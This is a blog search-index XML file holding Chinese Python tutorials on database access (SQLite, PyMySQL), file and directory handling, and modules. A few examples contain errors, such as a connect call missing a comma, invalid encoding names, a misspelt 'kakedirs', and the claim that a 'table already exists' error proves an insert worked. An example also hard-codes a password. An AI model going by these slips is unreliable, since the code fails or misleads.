<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Python知识整合（操作数据库）]]></title>
    <url>%2F2019%2F09%2F12%2FPython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、数据库编程接口市面有多种数据库如mysql、SQLite等等。为了对数据库进行统一的操作，大多数语言提供了简单的、标准化的数据库接口（API）。在Python Database API 2.0规范中，定义了Python数据库API接口的各个部分。下面我将介绍数据库API接口中的连接对象和游标对象 1.1、连接对象数据库连接对象（Connection Object）主要提供数据库游标对象和提交/回滚事物的方式，以及关闭数据库连接。 1.11、获取连接对象使用connect（）函数获取数据库连接，改函数具有多个参数，具体使用那个参数，根据数据库的类型而定。 onnect()函数参数说明表 参数 说明 dsn 数据源名称，给出该参数表示数据库依赖 user 用户名 password 用户密码 host 主机名 database 数据库名称 例子，使用PyMySql模块连接MySQL数据库（在下面内容中会详细介绍）。 conn = pymysql.connect(host=&apos;localhost&apos;, user=&apos;user&apos;, password=&apos;passwd&apos;, charset=&apos;utf-8&apos; cursorclass=pymysql.cursors.DictCursor) 注意pymysql.connect()使用的参数与上表不完全相同，要以具体的数据库模块为准。 1.12、连接对象方法connect（）函数返回连接对象，这个连接对象表示目前和数据库的会话。连接对象支持的方法如下表| 方法名 | 说明 || ———- | ———————————————————— || close() | 关闭数据库连接 || commit() | 提交事物 || rollback() | 回滚事物 || cursor() | 获取游标对象，操作数据库，如执行DML（触发器）操作，调用存储过程等 | 1.2、游标对象游标对象（Cursor Object）代表数据库中的游标，用于指示抓取数据操作的上下文，主要提供执行SQL语句、调用存储过程等。 通过cursor（）方法可以获取游标对象。 游标对象的属性：1、description:数据库列表类型和值的描述信息。2、rowcount():返回结果的函数统计信息，如SELECT、UPDATE等 游标对象的方法如下表| 方法名 | 说明 || ———————————- | ———————————————————— || callproc(procname[,parameters]) | 调用存储过程，需要数据库支持 || close() | 关闭当前游标 || execute（operation[,parameters]) | 执行SQL语句或者数据库命令等数据库操作 || executemany（operation,seq_params) | 用于批量操作，如批量删除 || fetchone() | 获取查询结果集中的下一条记录 || fetchmany(size) | 获取指定数量的记录 || fetchall() | 获取结果集中的所有记录 || nextset() | 跳至下一个可用的结果集 || arraysize() | 指定使用fetchmany获取的函数，默认为1 || setinputsize(sizes) | 设置在调用execute*()方法时分配的内存区域大小 || setoutputsize(sizes) | 设置列缓冲区大小，对大数据列如LONGS和BLOBS（二进制大对象）尤其有用 | 2、使用SQLiteSQLite（c语言写的）是一种嵌入式数据库，它的数据库是一个文件。体积小，且可以跨平台使用，经常被嵌入到各种应用程序。python中内置了SQLite3。 2.1、创建数据库文件python操作数据流的流程 开始&gt;&gt;创建connection(连接)&gt;&gt;获取cursor(游标)&gt;&gt;执行SQL语句，处理数据结果&gt;&gt;关闭cursor(游标)&gt;&gt;关闭connection(连接) ​如 import sqlite3 # 连接到SQLite数据库 conn = sqlite3.connect(&apos;1.db&apos;) # 数据库文件是test.db，如果文件不存在，会在当前目录创建 cursor = conn.cursor() # 创建一个Cursor cursor.execute(&apos;create table user (id int(10) primary key, name varchar(20))&apos;) # 执行一条SQL操作，创建user表 cursor.close() # 关闭游标 conn.close() # 关闭连接 2.2、操作SQLite2.21、新增用户数据信息使用以下SQL语句 insert into 表名 （字段名1，字段名1，........） values(字段值1，字段值2，.......） 例子 import sqlite3 # 连接到SQLite数据库 conn = sqlite3.connect(&apos;name.db&apos;) # 数据库文件是test.db，如果文件不存在，会在当前目录创建 cursor = conn.cursor() # 创建一个Cursor # 执行一条SQL操作，创建user表 cursor.execute(&apos;create table user (id int(10) primary key, name varchar(20))&apos;) # 执行一条SQL操作，向表user插入一条记录 cursor.execute(&apos;insert into user (id, name) values (&quot;1&quot;,&quot;wr&quot;)&apos;) cursor.execute(&apos;insert into user (id, name) values (&quot;2&quot;,&quot;小明&quot;)&apos;) cursor.close() # 关闭游标 conn.commit() # 提交事物 conn.close() # 关闭连接 为了验证程序是否正常可以再次运行程序，如果出现如下异常 sqlite3.OperationalError: table user already exists 则说明数据成功插入 2.22、查看用户数据信息可以使用以下SQL语句 select 字段名1，字段名2,..... from 表名 where 查询条件 fetchone():查询结果集中的下一条记录fetchmany(size) :获取指定数量的记录fetchall():获取结果集的所有记录 例子 import sqlite3 # 连接到SQLite数据库 conn = sqlite3.connect(&apos;name.db&apos;) # 数据库文件是name.db，如果文件不存在，会在当前目录创建 cursor = conn.cursor() # 创建一个Cursor # 执行查询语句 cursor.execute(&apos;select * from user&apos;) # 获取查询结果 result = cursor.fetchone() print(result) cursor.close() # 关闭游标 conn.close() # 关闭连接 修改上述 cursor.execute(&#39;select * from user&#39;) 这句代码为cursor.execute(&#39;select * from user where id &gt; ?&#39;,(1,))，其中使用问号作为占位符代替具体的值，然后使用最后一个元组来替换问号，注意元组最后面的逗号不能省略修改后的代码等价于cursor.execute(&#39;select * from user where id &gt; 1)不过推荐占位符的方式，因为可以有效防止SQL注入 2.23、修改用户数据信息可以使用以下sql语句 update 表名 set 字段名 = 字段值 where 查询语句 例子，将ID=1的name改为WR import sqlite3 # 连接到SQLite数据库 conn = sqlite3.connect(&apos;name.db&apos;) # 数据库文件是test.db，如果文件不存在，会在当前目录创建 cursor = conn.cursor() # 创建一个Cursor cursor.execute(&apos;update user set name = ? where id = ?&apos;, (&apos;WR&apos;, 1)) # 执行查询语句 cursor.execute(&apos;select * from user&apos;) # 获取查询结果 result1 = cursor.fetchall() print(result1) cursor.close() # 关闭游标 conn.commit() # 提交事务 conn.close() # 关闭连接 2.24、删除用户信息可以使用以下sql语句 delete from 表名 where 查询语句 3、使用MySQL可以直接安装phpstudy集成环境，包括mysql和apache数据库及其环境。安装步骤可以百度 3.1、安装PyMySQL模块在python中支持MYSQL的数据库模块很多，我们选择PyMySQL模块在命令行使用下面语句 pip install PyMySQL安装PyMySQL模块 3.2、连接数据库PyMySQL模块也遵循Python Database API 2.0规范，故MySQL的操作方法与SQLite类似例子 import pymysql # 打开数据库连接，参数1：主机名或IP;参数2：用户名；参数3：密码；参数4；数据库名称 db = pymysql.connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;, &quot;mydata&quot;) # 通过cursor()函数创建一个游标对象cursor cursor = db.cursor() # 使用execute()方法执行SQL查询 cursor.execute(&apos;SELECT VERSION()&apos;) # 使用 fetchone()方法获取单条信息 data = cursor.fetchone() print(&quot;database version： %s&quot; % data) # 关闭数据库连接、 db.close() 输出 database version： 5.5.53 3.3、创建数据表例子:通过execute()方法创建表books(图书表)。books包含id(主键)，name(图书名)，category（图书馆分类），price(图书馆价格) import pymysql # 打开数据库连接，参数1：主机名或IP;参数2：用户名；参数3：密码；参数4；数据库名称 db = pymysql.connect(&quot;localhost&quot;, &quot;root&quot;, &quot;390800956&quot;, &quot;mydata&quot;) # 通过cursor()函数创建一个游标对象cursor cursor = db.cursor() # 使用execute()方法执行SQL语句，如果存在就删除 cursor.execute(&apos;DROP TABLE IF EXISTS books&apos;) sql = &quot;&quot;&quot; CREATE TABLE books( id int(8) NOT NULL AUTO_INCREMENT, name varchar(50) NOT NULL, category varchar(50) NOT NULL, price decimal(10,2) DEFAULT NULL, PRIMARY KEY (id) ) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8; &quot;&quot;&quot; cursor.execute(sql) # 关闭数据库连接、 db.close() 3.4、操作数据表可以execute()方法添加一条记录，也可以使用executemany()方法进行批量添加记录语法格式 executemany(operation,seg_of_params) 说明：operation:执行的sql语句seg_of_params：参数序列 例子 import pymysql # 打开数据库连接，参数1：主机名或IP;参数2：用户名；参数3：密码；参数4；数据库名称 db = pymysql.connect(&quot;localhost&quot;, &quot;root&quot;, &quot;390800956&quot;, &quot;mydata&quot;, charset=&quot;utf8&quot;) # 通过cursor()函数创建一个游标对象cursor cursor = db.cursor() # 数据列表 data = [(&quot;《见识》&quot;, &quot;literature&quot;, &quot;50.00&quot;), (&quot;《智能时代》&quot;, &quot;data&quot;, &quot;70.00&quot;), (&quot;《活着》&quot;, &quot;literature&quot;, &quot;23.00&quot;)] try: # 执行SQL语句，插入多条数据 cursor.executemany(&quot;insert into books (name, category, price) values (%s, %s, %s)&quot;, data) # 提交数据 db.commit() except: # 发送错误时回滚 db.rollback() # 关闭数据库连接、 db.close() 在上面的代码中要注意1、在使用connect()方法时，设置charset=”utf8”,为得是识别中文2、在使用insert语句插入数据时，使用%s作为占位符，防止SQL注入]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python知识整合（文件及目录操作）]]></title>
    <url>%2F2019%2F09%2F12%2Fpython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E6%96%87%E4%BB%B6%E5%8F%8A%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、基本的文件操作python中内置了文件(fFle)对象,使用文件对象的大概流程如下：1、创建文件（通过内置open()函数）2、通过该对象提供的方法进行一些基本的文件操作，如write()、close()等方法 1.1、创建和打开文件可以通过open()方法实现语法格式： file = open(filename[,mode[,buffering]]) 说明：file:为被创建的文件对象filename:要创建或者打开的文件名，可以使用绝对路径和相对路径mode:可选参数，用于指定文件的打开模式，默认打开模式为只读（r）buffering: 可选参数，用于指定读写文件的缓存模式，值为0表示不缓存，1表示缓存，大于1表示缓冲区的大小，默认为读写模式 1.11、当打开不存在的文件，会抛出异常，解决办法有1、创建该文件2、在调用open（）函数时，指定mode的参数值为w、w+、a、a+。这样的话，如果要打开的文件不存在就会自动创建新文件，归根到底还是和第一钟方法相联系 1.12、以二进制的形式打开文件open()函数不仅可以以文本形式打开文件，还可以以二进制形式打开文件，只要将mode参数设置为rb、 rb+、 wb、 wb+、 ab 、ab+，就可以 如 file = open(&apos;1.jpg&apos;, &apos;rb&apos;) print(file) 输出 &lt;_io.BufferedReader name=&apos;1.jpg&apos;&gt; 可以看出创建的是一个BufferedReader（缓冲区读取）对象，该对象生成后我们可以使用第三方模块进行处理，如PIL的Image模块。 1.13、 打开文件时指定编码方式open()方法打开文件时，默认为GBK编码，如果被打开的文件的编码不是GBK那么会抛出异常 解决方法1、直接修改文件的编码2、打开文件时，指定使用的编码方式（推荐）。在使用open函数打开文件时，使用encoding= ‘编码方式’，指定编码方式。 如，打开采用UTF - 8编码保存的文件1.txt file = open(&apos;1.txt1&apos;,&apos;r&apos;,encoding= &apos;utf -8&apos;) 1.2、关闭文件文件打开后，使用完要及时关闭文件。可以使用close()方法语法格式 file.close() 说明：close()方法会先刷新缓冲区中未写入的数据，然后再关闭文件。这样可以将未写入文件的数据写入文件。文件关闭后，不能再进行写操作 1.3、打开文件时使用with语句如果在打开文件时如果抛出了异常，那么可能无法及时关闭文件。我们可以使用with语句避免这个问题语法格式： with expression as target with_body 参数说明：expression：用于指定一个表达式，这边可以是open()函数target: 用于指定一个变量，并将expression的结果保存到该变量里with-body:用于指定with语句体，其中可以是执行with语句后的相关一些操作语句，也可以是pass 如 with open(&apos;1.jpg&apos;, &apos;rb&apos;) as file: pass 1.4、写入文件内容使用write()函数语法格式 file.write(string) 部分参数说明：string为要写入的字符串 使用write()方法的前提是，在打开文件时，指定的打开模式为w(可写)或者a（追加）等等 1.5、读取文件读取文件主要分为以下3种情况。 1.51、读取指定字符串1、从头开始读取文件内容使用read()方法，语法格式 file.read([size]) #size用于指定要读取的字符个数，如果省略，则一次性读取全部 例子，注意打开模式只能为r或者r+ with open(&apos;2.txt&apos;, &apos;r+&apos;) as file: print(file.read(2)) 2、读取部分内容使用seek()方法将指针移动到新的位置，再用read(size)方法读取。seek()基本语法 file.seek(offset[,whence]) 部分参数说明offset:用于指定移动的字符个数，其具体位置与whence有关whence：用于指定从什么位置开始算。0表示从文件头开始计算，1表示当前位置，2表示文件尾，默认为0。注意如果在打开文件时，没有使用b模式，那么只允许从文件头开始计算，从文件尾会报错。使用seek()方法时，offset的值是一个汉字占2个字符，一个数字或者英文占一个字符，与read（）方法不同。 例子 with open(&apos;2.txt&apos;, &apos;r&apos;) as file: file.seek(3) print(file.read(2)) 1.52、读取一行使用readline()方法，语法格式 file.readline() 文件的打开模式要求与使用read（）方法一样例子，一行一行输出2.txt里的内容 with open(&apos;2.txt&apos;, &apos;r&apos;, encoding=&quot;utf-8&quot;) as file: number = 0 # 记录行号 while True: number += 1 line = file.readline() if line == &apos;&apos;: break print(number, line) # 输出一行的内容 1.53、读取全部行使用readlines()方法，语法格式 file.readlines() # 返回类型为字符串列表 例子：2.txt文件内容为学无止境python有趣好好学习天天向上 with open(&apos;2.txt&apos;, &apos;r&apos;, encoding=&quot;utf-8&quot;) as file: print(file.readlines()) 输出 [&apos;学无止境\n&apos;, &apos;python有趣\n&apos;, &apos;好好学习\n&apos;, &apos;天天向上&apos;] 可以看出返回一个字符串列表，但是如果文件比较大，这种方法效率太低，这时可以将列表内容逐行输出，修改后的代码为 with open(&apos;2.txt&apos;, &apos;r&apos;, encoding=&quot;utf-8&quot;) as file: a = file.readlines() for i in a: print(i) 2、目录操作python中并没有直接提供操作目录的函数或者对象，而是通过内置的os和os.path模块实现。 其中os模块是python内置的与操作系统功能和文件系统相关的模块，该模块上执行结果通常与操作系统有关，在不同的操作系统上执行可能会有不同的效果这边的操作系统为windows系统 2.1、os和os.path模块要使用os和os.path模块 ，首先要使用import语句导入，代码如下 import os 导入os模块后，也可以使用其子模块os.pathos模块提供的常用的变量有以下几个1、name:用于获取操作系统类型如 import os print(os.name) 输出 nt # nt为windows系统，posix为Linux、UNIX或者Mac OS操作系统 2、linesep:用于获取当前操作系统的换行符 3、sep:用于获取当前存在系统的路径分隔符 os模块提供的与目录相关的函数| getcwd() | 返回当前的工作目录 || ——————————– | ———————————————————— || listdir(path) | 返回指定路径下的文件和目录信息 || mkdir(path [,mode]) | 创建目录 || kakedirs(path1/path2/……..) | 创建多级目录 || rmdir(path) | 删除目录 || removedirs(path1/path2/……..) | 删除多级目录 || chdir(path) | 把path设置为当前工作目录 || walk(top [,topdown[,onerror]]) | 遍历目录树，该方法返回一个元组，包括所有路径名、所有目录列表和文件列表3个元素 | os.path模块提供的与目录相关的函数| 函数 | 说明 || —————- | ————————————————– || abspath(path) | 用于获取文件或目录的绝对路径 || exists（path） | 用于判断路径是否存在，存在返回True,不存在返回False || join(path,name) | 将目录与目录或者与文件名拼接起来 || splitext() | 分离文件名和扩展名 || basename（path） | 从一个目录中提取文件名 || dirname（path） | 从一个路径中提取文件路径，不包括文件名 || isdir(path) | 用于判断是否为路径 | 2.2、路径1、包括绝对路径和相对路径 2、可以使用os模块提供的getcwd()函数获取当前工作目录代码如下 import os print(os.getcwd()) 在python中，指定文件路径时要对路径分隔符进行“\”转义,即将路径分隔符 “\”替换为”\“。也可以用“/”代替。 3、拼接目录使用os.path.join()函数进行拼接，语法格式为 os.path.join(path1 [,path2[,.......]]) （1）、path1、path2为要拼接的路径，如果要拼接的路径中没有一个是绝对路径那么拼接出来的路径就是相对路径。（2）、使用 os.path.join()拼接路径时，并不会检测该路径是否真实存在如 import os print(os.path.join(&quot;E：\\Pyth&quot;, &quot;web\\ 1.txt&quot;)) 输出 E：\Pyth\web\ 1.txt 在使用os.path.join()函数时，如果要拼接的路径中有多个绝对路径，那么以从左到右最后一次出现的为准，之前的参数会被忽略，如import os print(os.path.join(&quot;E:\\Pyth&quot;, &quot;D:\\txt&quot; , &quot;demo&quot;)) 输出 D:\txt\demo 注意：2个路径要拼接在一起时，不要直接使用字符串拼接，而是使用os.path.join()函数，这样可以处理不同操作系统的分隔符。 2.3、判断目录是否存在使用os.path.exists()函数，语法格式如下 os.path.exists(path) 路径存在返回True,不存在返回False,path可以为绝对路径或者相对路径，该函数还可以判读文件算法存在 2.4、创建目录2.41、创建一级目录使用os.mkdir(）函数创建目录，该函数只能创建一级目录，也就是知道路径的最后一级目录，如果该目录的上一级目录不存在，则会抛出异常，如果要创建的路径已经存在也会抛出异常语法格式 os.mkdir(path,mode= 0o777) mode用于指定数值的模式，默认值为0777，该参数在非UNIX系统时无效或者被忽略如，创建一个C:\demo目录（windows系统） import os os.mkdir(&quot;C:\\demo&quot;) 那如何避免上面所说的创建的路径已经存的问题呢。可以使用以下代码，先判断，再创建 import os path = &quot;C:\\demo&quot; if not os.path.exists(path): # 判断目录是否存在 os.mkdir(path) print(&quot;创建目录成功&quot;) else: print(&quot;目录已经存在&quot;) 2.42、创建多级目录使用os.makedirs()函数，语法格式 os.makedirs(name, mode = 0o777) name:用于指定要创建目录例子在windows系统上创建一个多级目录 import os path = &quot;C:\\demo\\web\\mr&quot; os.makedirs(path) 2.5、删除目录通过os.rmdir（）函数可以删除目录，且要删除的目录为空时才有效，语法格式 os.rmdir(path) 如 import os path = &quot;C:\\Desktop\\web&quot; os.rmdir(path) 删除后的目录 C:\Desktop\web 如果目录不存在会抛出异常，将代码进行改进 import os path = &quot;C:\\Desktop\\web&quot; if os.path.exists(path): os.rmdir(path) print(&quot;目录成功删除&quot;) else: print(&quot;该目录不存在&quot;) 注意：os.rmdir()函数只能删除空目录，如果要删除非空目录，可以使用python中内置模块shutil的rmtree()函数实现。如，删除不为空的目录C:\Desktop\web import shutil shutil.rmtree(&quot;C:\\Desktop\\web&quot;) 2.6、遍历目录使用os.walk()函数，语法如下 os.walk(top [, topdown] [,onerror] [,follwlinks]) 参数说明top：用于指定要遍历的内容的根目录 topdown:可选参数用于指定遍历的顺序，值为True就是自上而下的遍历（从根目录开始），如果值为False就是自下而上的遍历。默认为True onerror: 可选参数，用于指定错误处理方式，默认忽略，也可以指定一个错误处理函数，一般采用默认 followlinks: 可选参数，在默认情况下，walk（）函数不会向下转换成解析到目录的符号链接。将该参数值设置为True,表示用于在支持的系统上访问由符号链接指向的目录 返回值： 返回3个元素（dirpath、dirnames、filenames）的元组生成器对象。dirpath表示当前遍历的路径，是一个字符串；dirnames表示当前路径下包含的子目录，是一个列表，filenames表示当前路径下包含的文件，是一个列表 如,遍历D:\Python\web目录 import os # 遍历D:\Python\web目录 tuples = os.walk(&quot;D:\\Python\\web&quot;) for tuplel in tuples: # 通过for循环输出遍历结果 print(tuplel, &apos;\n&apos;) 注意：walk()函数只在windows系统和UNIX系统中有效。 3、文件的高级操作os模块中与文件相关的函数| 函数 | 说明 || —————————- | ———————————————————— || access(path,accessmode) | 获取对文件是否有指定的访问权限（读取，写入，执行权限）。accessmod的值是R_OK(读取)、W_OK(写人)、X_OK(执行)或F_OK(存在)。如果有指定的权限，则返回1，否则返回0 || chmod(path,mode) | 修改path指定文件的访问权限 || remove(path) | 删除path指定的文件路径 || rename(src,dst) | 将文件或目录src重命名为dst || stat(path) | 返回path指定文件的信息 || startfile(path [,operation]) | 使用关联的应用程序打开path指定的路径 | 3.1、删除文件使用os.remove（)函数，语法格式 os.remove(path) 如，删除当前目录下的2.txt文件，代码如下 import os path = &quot;2.txt&quot; # 使用相对路径（绝对路径也可以），要删除的文件 if os.path.exists(path): # 判断文件是否存,防止文件不存在时抛出异常 os.remove(path) print(&quot;文件删除成功&quot;) else: print(&quot;该文件不存在&quot;) 3.2、重命名文件和目录使用os.rename()函数，如果指定的路径是文件，则重命名文件，如果是目录，则重命名目录，语法格式 os.rename(src,dst) 例子：将当前目录下的2.txt重命名为1.txt import os src = &quot;D:\\Python\\web\\2.txt&quot; dst = &quot;D:\\Python\\web\\1.txt&quot; # 使用绝对路径（相对路径也可以），要删除的文件 if os.path.exists(src): # 判断文件是否存 os.rename(src, dst) print(&quot;文件重命名成功&quot;) else: print(&quot;该文件不存在&quot;) 值得注意的是使用rename()函数重命名目录时操作与重命名文件一样，但是只能修改最后一级的目录名称，否则会抛出异常。 3.3、获取文件的基本信息通过os.stat()函数可以获取文件的基本信息，语法格式如下 os.stat(path) start()函数返回式的对象的常用属性| 属性 | 说明 | 属性 | 说明 || ——– | ———————— | ——– | ———————————————————— || st_mode | 保护模式 | st_dev | 设备名 || st_ino | 索引号 | st_uid | 用户ID || st_nlink | 硬连接号（被连接的数目） | st_gid | 组ID || st_size | 文件大小，单位为字节 | st_atime | 最后一次询问时间 || st_mtime | 最后一次修改时间 | st_ctime | 最后一次状态变化的时间（不同系统不一样，如windows系统返回的是问卷创建的时间） | 4、牛刀小试1、查找特定目录D:\Python\web下以m开头的文件import os, re input_dir = os.walk(&quot;D:\\Python\\web&quot;) for dirPath, dirNames, fileNames in input_dir: # 根据os.walk输出目录信息 for fileName in fileNames: # 对文件列表进行遍历 pattern = r&apos;^m+&apos; # 模式字符串 match = re.match(pattern, fileName) # 查找匹配条件的文件名 if match: # 判断是否匹配成功 print(os.path.join(dirPath, fileName)) # 拼接目录和文件名，并输出 或者 import os, re input_dir = input(&quot;please input the search dir:&quot;) for dirPath, dirNames, fileNames in os.walk(input_dir): # 根据os.walk输出目录信息 for fileName in fileNames: # 对文件列表进行遍历 pattern = r&apos;^m+&apos; # 模式字符串 match = re.match(pattern, fileName) # 查找匹配条件的文件名 if match: # 判断是否匹配成功 print(fileName) print(os.path.join(dirPath, fileName)) # 拼接目录和文件名，并输出 2、复制C盘下的1.log文件到你的程序目录，然后修改日志中的所有的Aug为wr，并把修改后的文件保存到wr.txtimport shutil shutil.copyfile(&apos;C:\\1.log&apos;, &apos;D:\\Python\\web\\1.txt&apos;) # 复制文件到程序目录下 file = open(&apos;1.txt&apos;, &apos;r&apos;) file_new = open(&apos;wr.txt&apos;, &apos;w&apos;) for line in file: # 按行读取文件内容 if &quot;Aug&quot; in line: # 查找我们所需要修改的内容 line = line.replace(&quot;Aug&quot;, &quot;wr&quot;) #替换Aug为wr file_new.write(line) #修改后的内容写入新文件里 file.close() file_new.close() 或者 import shutil shutil.copyfile(&apos;C:\\1.log&apos;, &apos;D:\\Python\\web\\1.txt&apos;) with open(&apos;1.txt&apos;, &apos;r&apos;) as file: with open(&apos;wr.txt&apos;, &apos;w&apos;) as new_file: for line in file: if &quot;Aug&quot; in line: line = line.replace(&quot;Aug&quot;, &quot;wr&quot;) new_file.write(line)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python知识整合（模块）]]></title>
    <url>%2F2019%2F09%2F12%2Fpython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E6%A8%A1%E5%9D%97%EF%BC%89%2F</url>
    <content type="text"><![CDATA[1、自定义模块在Python中一个.py文件就是一个模块。 在python中自定义模块有2个作用。一个是规范代码，让代码更易于阅读。另一个是方便其他程序使用已经编写好的代码，提高开发效率、 要实现自定义模块主要分为创建模块和导入模块2部分。 1.1、创建模块就是将模块中的相关代码编写在单独的文件中，文件名为模块名.py要注意的是设置的模块名不能与python自带的标准库名称一样。如果一样的话。先导入了我们自定义的模块后，就不能再导入python自带的标准库 1.2、使用import语句导入模块使用import导入语法格式 import modulename [as alias] 部分参数说明： [as alias] 给模块起的别名，可以通过该别名使用模块 在调用模块中的变量、函数或者类等时，需要在变量、函数或者类名前面添加“模块名.” 使用import语句也可以一次导入多个模块如 import re,requests,os 1.3、使用from…import语句导入模块在使用import语句导入模块时，每执行一条import语句就会创建一个新的命名空间，且在调用模块中的变量、函数或者类时，需要在变量、函数或者类名前面添加“模块名.”。 使用from…import语句导入模块是把具体的定义导入到当前的命名空间，不需要添加前缀，直接通过具体的变量、函数或者类等访问即可。 语法格式: from modelname import member 参数说明：modelname：模块名区分大小写member：用于指定要导入的变量、函数或者类等，可以同时导入多个定义，如果要想导入全部定义使用“*”代替。 注意：在导入模块时，如果使用了通配符*导入全部定义之后，可以使用dir()来查看具体导入了哪些定义。 1.3、模块搜索的目录当使用import语句导入模块时，在默认的情况下，按一下顺序进行查找1、在当前目录进行查找2、在python环境变量下的每个目录查找3、到python的默认安装目录下查找 说明的各个目录的具体位置都是保存在标准模块sys的sys.path变量中。可以通过一下代码输出具体的目录 import sys print(sys.path) 如果要导入的模块不在标准模块sys的sys.path变量中，会报错。（注意模块名区分大小写） 这时有3种方式可以将指定的目录添加到sys.path中 1、临时添加通过该方法添加的目录只在执行当前文件的窗口有效，窗口关闭后就失效。语法格式 import sys sys.path.append(&quot;要添加的指定目录&quot;) 2、增加.pth文件（推荐） 在python安装目录的子目录Lib\site-packages子目录中，创建一个扩展名为.pth的文件，文件名任意，在该文件中添加要导入模块所在的目录。然后重新打开要执行导入模块的python文件，使得新添加的目录生效。 通过该方法添加的目录只在当前版本的python中有效 3、在PYTHONPATH环境变量中添加在系统的环境变量对话框中，查找在PYTHONPATH环境变量，如果没有就创一个，然后添加所要导入的模块的目录。然后重新打开要执行导入模块的python文件，使得新添加的目录生效。 通过该方法添加的目录在不同版本的python中都有效 2、以主程序的形式执行创建一个aaa模块 p = &quot;苹果&quot; def fun_c(): p = &quot;一个烂苹果&quot; print(p) if __name__==&quot;__main__&quot;: print(&quot;哈哈哈哈&quot;) 在text中导入该模块 import aaa print(aaa.p) 输出 苹果 说明：如果在aaa模块中没有if语句的话，会把下面的测试语句（ print(“哈哈哈哈”)）也一块执行。但是我们只想要输出变量p。故将测试语句放入if语句。 3、python中的包python中的包是一个分层的目录结构，它将一组功能相近的模块组织在一个目录下，这样就可以起到代码规范的作用，又可以避免模块重名引起的冲突 简单来说python的包就是一个含义init.py的文件的文件夹 3.1、创建1、创建包就是创建一个文件夹，并在文件里创建一个名称为init.py的文件。在init.py文件里可以不编写代码，也可以编写代码，在导入包时会自动执行。 注意：init.py文件是一个模块文件，模块名为包名。在a包中创建的init.py文件，对应的模块名为a 3.2、使用包创建包，然后在包中创建相应的模块，然后再使用import语句从包中加载模块。从包中加载模块有以下3种方式。 1、通过”import+完整包名+模块名”的方式加载指定模块语法格式 import 完整包名.模块名 通过该方式，访问模块中的变量时，语法格式如下 完整包名.模块名.变量名 2、通过”from+完整包名+import+模块名”的方式加载指定模块语法格式： from 完整包名 import 模块名 通过该方式，访问模块中的变量时，语法格式如下 模块名.变量名 3、通过通过”from+完整包名+import+模块名+定义名”的方式加载指定模块语法格式 from 完整包名.模块名 import 定义名1，定义名2，.... 定义名可以是函数、类、变量名等 通过该方式，访问模块中的函数、类、变量等，语法格式如下 定义名 如果使用*号则表示加载该模块下的所有定义 4、引用其他模块在python中除了自定义模块，还有其他模块，主要包括标准模块和第三方模块。 下表为python中常用的内置的标准模块| 模块名 | 概述 || ——– | ———————————————————— || sys | 与python解释器及其环境操作相关的标准库 || time | 提供与时间相关的各种函数的标准库 || os | 提供了访问操作系统服务功能的标准库 || calendar | 提供了与日期相关的各种函数的标准库 || urllib | 用于读取来自网上（服务器上）的数据的标准库 || json | 用于使用JSON序列化和反序列化 || re | 用于在字符串中执行正则表达式匹配和替换 || math | 提供标准算术运算函数的标准库 || decimal | 用于进行精确控制运算精度、有效位数和四舍五入操作的十进制运算 || shutil | 用于进行高级文件操作，如复制等 || logging | 提高了灵活的记录事件、错误、警告和调试信息等日志信息的功能 || thinker | 使用python进行GUI编程的标准库 |当然python有许多标准库,可以在python的安装目录下，的DOC目录下的扩展名为.chm文件（就是python的帮助文档）打开文件，文件里的The Python Standard Library下面的Python Runtime Services里进行查看，当然也可以上网查找。 5、牛刀小试5.1、输出6位数的验证码要求确保6位数中有一位大写字母，一位小写字母，一位数字 import random, string code_li = [] &quot;&quot;&quot;确保6位数中有一位大写字母，一位小写字母，一位数字&quot;&quot;&quot; code_li.append(random.choice(string.ascii_lowercase)) # 随机添加小写字母 code_li.append(random.choice(string.digits)) # 随机添加 code_li.append(random.choice(string.ascii_uppercase)) # 随机添加大写字母 while len(code_li)&lt;6: code_li.append(random.choice(string.ascii_lowercase+string.digits+string.ascii_uppercase)) print(code_li) q_code = &quot;&quot;.join(code_li) &quot;&quot;&quot; join()函数 语法： &apos;sep&apos;.join(seq) 参数说明 sep：分隔符。可以为空 seq：要连接的元素序列、字符串、元组、字典 上面的语法即：以sep作为分隔符，将seq所有的元素合并成一个新的字符串 返回值：返回一个以分隔符sep连接各个元素后生成的字符串 &quot;&quot;&quot; print(q_code) 5.2、转化为时间戳把2019-01-02 20:12:54转化为时间戳 import time dt = &quot;2019-01-02 20:12:54&quot; timeArray = time.strptime(dt,&quot;%Y-%m-%d %H:%M:%S&quot;) # 根据指定的格式把一个时间字符串解析为时间元组。(转化为时间戳) # timestamp = time.mktime(timeArray) # 返回用秒数来表示时间的浮点数 # print(timestamp) print(timeArray)]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[python知识整合（面向对象程序设计）]]></title>
    <url>%2F2019%2F09%2F12%2Fpython%E7%9F%A5%E8%AF%86%E6%95%B4%E5%90%88%EF%BC%88%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%EF%BC%89%2F</url>
